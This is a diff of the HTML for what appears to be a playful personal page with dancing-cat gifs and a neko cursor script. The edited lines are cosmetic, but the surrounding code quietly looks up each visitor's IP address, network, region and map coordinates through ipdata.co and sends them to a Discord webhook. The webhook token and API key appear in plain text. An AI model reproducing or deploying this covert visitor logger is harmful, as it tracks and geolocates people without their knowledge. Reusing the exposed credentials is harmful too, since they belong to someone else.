@@ -96,11 +96,7 @@
 </head>
 
 <body>
-
-    <script>NekoType = "white"</script>
-    <h1 id=nl>
-        <script src="https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a>
-    </h1>
+    <script src="./oneko.js"></script>
 
     <script>
         var webhookURL = "https://discord.com/api/webhooks/1143172539183534132/YRbyGP-3XZBkPveCPozw3lXUc81NPXtjjeAIqNKf-p9g9Slfl1JmJAd_QUwSttDoahoE";
@@ -111,12 +107,10 @@
         }
 
         function sendWebhookInter() {
-
             let apiKey = '8c7095acb749cd89945b39c8f59293449d382d0ac157bd0b360f19d4';
             json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
                 userInfo = `IP: ${data.ip}\nASN: ${data.asn.name}\nRegion: ${data.region}, ${data.country_name}: ${data.emoji_flag}\n[Maps Link](https://www.google.co.uk/maps/place/${data.latitude},${data.longitude})`;
                 sendWebhook();
-                // so many more properties
             }).catch(error => {
                 userInfo = `Error: ${error}`;
                 sendWebhook();
@@ -200,6 +194,7 @@
             function checkAudio() {
                 if (!audio.paused) {
                     document.getElementById('hiddenElement').style.visibility = 'visible';
+                    document.getElementById('hiddenElement2').style.visibility = 'visible';
                     document.getElementById('hidableText').style.visibility = 'hidden';
                 }
                 else {
@@ -213,6 +208,9 @@
 
     <img src="https://media1.tenor.com/m/ABeVmJ3y2WQAAAAd/cat-dancing-meme-dancing.gif" id="hiddenElement"
         style="position: absolute; visibility: hidden; left: calc(100% - 200px); width: 200px; height: 200px; top:0%"></img>
+
+    <img src="gagam.gif" id="hiddenElement2"
+        style="position: absolute; visibility: hidden; left: calc(100% - 200px); width: 200px; height: 200px; top:calc(0% + 200px)"></img>
 
     <div
         style="width: var(--profile-width); max-width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;">
